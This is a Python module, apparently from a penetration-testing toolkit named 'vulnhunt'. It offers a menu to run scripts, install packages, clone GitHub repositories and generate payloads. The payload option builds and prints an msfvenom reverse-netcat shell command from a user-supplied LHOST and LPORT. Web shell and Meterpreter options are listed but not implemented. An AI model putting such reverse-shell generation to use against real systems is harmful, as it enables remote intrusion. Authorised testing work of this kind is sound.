#!/usr/bin/env python3

import subprocess
import sys
import os
from colorama import Fore, Style

def run():
    print(f"{Fore.CYAN}\n[+] Custom Tool Integration Module")
    print(f"{Fore.YELLOW}[*] Available integrations:")
    print("1. Custom Script Runner")
    print("2. Tool Installer")
    print("3. GitHub Tool Downloader")
    print("4. Custom Payload Generator")
    
    choice = input(f"{Fore.WHITE}[?] Select option: ").strip()
    
    if choice == "1":
        script_path = input(f"{Fore.WHITE}[?] Enter script path: ").strip()
        if os.path.exists(script_path):
            print(f"{Fore.GREEN}[+] Running custom script: {script_path}")
            subprocess.run([sys.executable, script_path])
        else:
            print(f"{Fore.RED}[!] Script not found: {script_path}")
    
    elif choice == "2":
        tool_name = input(f"{Fore.WHITE}[?] Enter tool name to install: ").strip()
        cmd = f"sudo apt install {tool_name}"
        print(f"{Fore.GREEN}[+] Running: {cmd}")
        subprocess.run(cmd.split())
    
    elif choice == "3":
        repo_url = input(f"{Fore.WHITE}[?] Enter GitHub repository URL: ").strip()
        repo_name = repo_url.split('/')[-1].replace('.git', '')
        cmd = f"git clone {repo_url} /opt/vulnhunt/tools/{repo_name}"
        print(f"{Fore.GREEN}[+] Running: {cmd}")
        subprocess.run(cmd.split())
        print(f"{Fore.GREEN}[+] Tool downloaded to: /opt/vulnhunt/tools/{repo_name}")
    
    elif choice == "4":
        print(f"{Fore.YELLOW}[*] Payload Generation Options:")
        print("1. Reverse Shell Payload")
        print("2. Web Shell")
        print("3. Meterpreter Payload")
        payload_choice = input(f"{Fore.WHITE}[?] Select payload type: ").strip()
        
        if payload_choice == "1":
            lhost = input(f"{Fore.WHITE}[?] Enter LHOST: ").strip()
            lport = input(f"{Fore.WHITE}[?] Enter LPORT: ").strip()
            cmd = f"msfvenom -p cmd/unix/reverse_netcat LHOST={lhost} LPORT={lport} R"
            print(f"{Fore.GREEN}[+] Generated payload command:")
            print(f"{Fore.WHITE}{cmd}")
    
    else:
        print(f"{Fore.RED}[!] Invalid selection")